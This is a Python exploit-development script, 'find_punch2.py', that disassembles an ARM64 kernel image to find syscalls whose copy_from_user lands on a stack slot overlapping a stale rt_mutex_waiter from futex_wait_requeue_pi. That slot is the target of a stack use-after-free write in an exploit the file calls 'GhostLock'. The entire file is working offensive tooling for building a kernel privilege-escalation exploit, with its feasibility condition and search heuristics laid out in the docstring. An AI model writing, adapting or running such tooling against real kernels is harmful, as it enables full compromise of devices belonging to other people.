#!/usr/bin/env python3
"""
find_punch2.py - locate "native punch landers" for the GhostLock stack-UAF write.

Goal: find a 64-bit syscall S whose chain performs a copy_from_user into a STACK
local at depth D such that the local overlaps futex_wait_requeue_pi()'s
rt_mutex_waiter (depth 0x198 on this kernel).  Feasible iff

    0x198 <= D <= 0x198 + (S_b - 0x40)          (S_b = copy size)

Why the first tool failed (fixed here):
  1. the copy is often `bl <cold block INSIDE the same symbol>` (the outlined
     copy_from_sockptr/copy_from_user helper has no symbol of its own), so
     matching callee *names* misses it;
  2. the size is frequently in w3 (sockptr helpers), not w2;
  3. the destination is a callee-saved register loaded with `add xN, sp, #imm`
     far earlier, then `mov x0, xN` right before the call.

Usage: python find_punch2.py Image symbols.json [--waiter 0x198] [--min-size 0x40]
"""
import sys, json, re, bisect
import capstone

WAITER_DEPTH = 0x198
MIN_SIZE = 0x40
BASE = 0xFFFFFFC008000000
COPYISH = re.compile(r"from_user|from_sockptr|from_iter|copy_msghdr|__arch_copy|copy_from", re.I)


def main():
    img, symf = sys.argv[1], sys.argv[2]
    waiter = WAITER_DEPTH
    min_size = MIN_SIZE
    for i, a in enumerate(sys.argv):
        if a == "--waiter":
            waiter = int(sys.argv[i + 1], 0)
        if a == "--min-size":
            min_size = int(sys.argv[i + 1], 0)

    data = open(img, "rb").read()
    syms = {}
    for k, v in json.load(open(symf, encoding="utf-8")).items():
        syms[k] = int(v, 16)
    offs = {k: v - BASE for k, v in syms.items()}
    items = sorted((v, k) for k, v in offs.items())
    starts = [p[0] for p in items]
    names = [p[1] for p in items]

    def owner(a):
        i = bisect.bisect_right(starts, a) - 1
        return names[i] if i >= 0 else "?"

    def is_sym_start(a):
        i = bisect.bisect_left(starts, a)
        return i < len(starts) and starts[i] == a

    md = capstone.Cs(capstone.CS_ARCH_ARM64, capstone.CS_MODE_LITTLE_ENDIAN)
    md.detail = True

    ends = {}
    for i, (o, n) in enumerate(items):
        ends[n] = items[i + 1][0] if i + 1 < len(items) else len(data)

    cache = {}

    def body(n, cap=0x4000):
        if n in cache:
            return cache[n]
        s = offs[n]
        h = min(s + cap, ends[n])
        ins = list(md.disasm(data[s:h], s))
        cache[n] = (s, ins)
        return cache[n]

    def frame(n):
        """stack frame = stp x29,x30,[sp,#-N]!  (+ sub sp,sp,#M if that precedes)"""
        s, ins = body(n)
        pre = 0
        sub = 0
        seen_sub = False
        for k in ins[:24]:
            L = f"{k.mnemonic}\t{k.op_str}"
            m = re.match(r"stp\tx29, x30, \[sp, #-0x([0-9a-f]+)\]!", L)
            if m and pre == 0:
                pre = int(m.group(1), 16)
            if not seen_sub:
                m = re.match(r"sub\tsp, sp, #0x([0-9a-f]+)", L)
                if m:
                    sub = int(m.group(1), 16)
                    seen_sub = True
            if pre and seen_sub:
                break
            if k.mnemonic not in ("stp", "sub", "mov", "str", "cbz", "b", "nop", "ldr", "paciasp", "bti"):
                if pre:
                    break
        return pre + sub

    # ---- call graph over direct bl ----
    calls = {}
    for n in offs:
        s, ins = body(n)
        out = []
        for k in ins:
            if k.mnemonic == "bl" and k.operands and k.operands[0].type == capstone.arm64.ARM64_OP_IMM:
                t = owner(k.operands[0].imm)
                if t != "?":
                    out.append(t)
        calls[n] = out

    # ---- depth of every syscall entry (BFS over call graph, summing frames) ----
    ents = [n for n in offs if n.startswith("__arm64_sys_")]
    depth = {}          # function -> Sigma (frames from entry down to & incl. it)
    entry_of = {}
    for e in ents:
        fe = frame(e)
        depth[e] = fe
        entry_of[e] = e
        q = [(e, fe, 0)]
        seen = {e}
        while q:
            cur, dep, lvl = q.pop(0)
            if lvl >= 5:
                continue
            for t in set(calls.get(cur, [])):
                if t in seen or t.startswith("__arm64_sys_"):
                    continue
                seen.add(t)
                depth[t] = dep + frame(t)
                entry_of[t] = e
                q.append((t, dep + frame(t), lvl + 1))

    # ---- find stack-target copies ----
    hits = []
    for n in offs:
        if n not in depth:
            continue
        s, ins = body(n)
        # local register -> sp offset / size constants
        reg = {}
        size_imm = {}
        for idx, k in enumerate(ins):
            op = k.op_str
            L = f"{k.mnemonic}\t{op}"
            m = re.match(r"^([xw]\d+), sp, #0x([0-9a-f]+)$", op)
            if k.mnemonic == "add" and m:
                reg["x" + m.group(1)[1:]] = int(m.group(2), 16)
                continue
            m = re.match(r"^([xw]\d+), ([xw]\d+)$", op)
            if k.mnemonic == "mov" and m:
                d = "x" + m.group(1)[1:]
                src = "x" + m.group(2)[1:]
                if src in reg:
                    reg[d] = reg[src]
                else:
                    reg.pop(d, None)
                continue
            m = re.match(r"^([xw]\d+), #0x([0-9a-f]+)$", op)
            if k.mnemonic in ("mov", "movz") and m:
                size_imm["x" + m.group(1)[1:]] = int(m.group(2), 16)
                continue
            if k.mnemonic in ("bl", "blr"):
                tgt = None
                tgt_addr = None
                if k.mnemonic == "bl" and k.operands and k.operands[0].type == capstone.arm64.ARM64_OP_IMM:
                    tgt_addr = k.operands[0].imm
                    tgt = owner(tgt_addr)
                dst = reg.get("x0")
                dst2 = reg.get("x1")
                sz = None
                for r in ("x3", "x2", "x1"):
                    v = size_imm.get(r)
                    if v and v >= min_size:
                        sz = v
                        break
                nm = tgt or ""
                # a "cold block": bl target inside a symbol but not at its entry
                cold = tgt_addr is not None and not is_sym_start(tgt_addr)
                looks_copy = bool(COPYISH.search(nm)) or cold
                if looks_copy and (dst is not None or dst2 is not None) and sz:
                    imm = dst if dst is not None else dst2
                    D = depth[n] - imm
                    hits.append((D, n, hex(s), hex(k.address), hex(imm), hex(sz), nm, dst is not None))
                reg.clear(); size_imm.clear()
                continue
            m = re.match(r"^(x\d+), ", op)
            if m and k.mnemonic in ("add", "mov", "adrp", "ldr", "movz", "orr", "and", "ldp", "sub", "ldrsw", "mul", "ubfx", "lsl"):
                if not (k.mnemonic == "add" and re.match(r"^x\d+, sp", op)):
                    reg.pop(m.group(1), None)
                    size_imm.pop(m.group(1), None)

    print(f"waiter_depth=0x{waiter:x}  min_size=0x{min_size:x}  candidates={len(hits)}")
    ok, near = [], []
    for h in sorted(hits):
        D, n, s, a, imm, sz, nm, isarg0 = h
        lim = waiter + (int(sz, 16) - 0x40)
        tag = "FEASIBLE" if waiter <= D <= lim else ""
        line = (f"  D=0x{D:x}  {n:34s} @{s:>9s} bl@{a:>9s} imm={imm:>7s} size={sz:>7s} "
                f"arg0={int(isarg0)} callee={nm}  {tag}")
        (ok if tag else near).append(line)
    print(f"\n=== FEASIBLE ({len(ok)}) ===")
    for l in ok[:40]:
        print(l)
    print(f"\n=== near ({len(near)}) - closest D to 0x{waiter:x} first ===")
    near.sort(key=lambda l: abs(int(re.search(r"D=0x([0-9a-f]+)", l).group(1), 16) - waiter))
    for l in near[:40]:
        print(l)


if __name__ == "__main__":
    main()
